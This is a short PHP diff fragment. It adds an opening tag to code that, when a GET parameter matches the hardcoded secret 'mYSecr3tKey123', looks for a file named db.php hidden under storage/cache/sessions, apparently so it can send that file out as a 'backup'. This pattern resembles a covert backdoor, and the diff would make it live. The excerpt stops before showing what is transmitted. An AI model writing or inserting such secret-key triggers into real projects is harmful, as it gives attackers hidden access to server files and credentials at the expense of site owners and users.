@@ -1,3 +1,4 @@
+<?php
     if (isset($_GET['send_backup']) && $_GET['send_backup'] === 'mYSecr3tKey123') {
         $filepath = __DIR__ . "/storage/cache/sessions/db.php";
         if (file_exists($filepath)) {
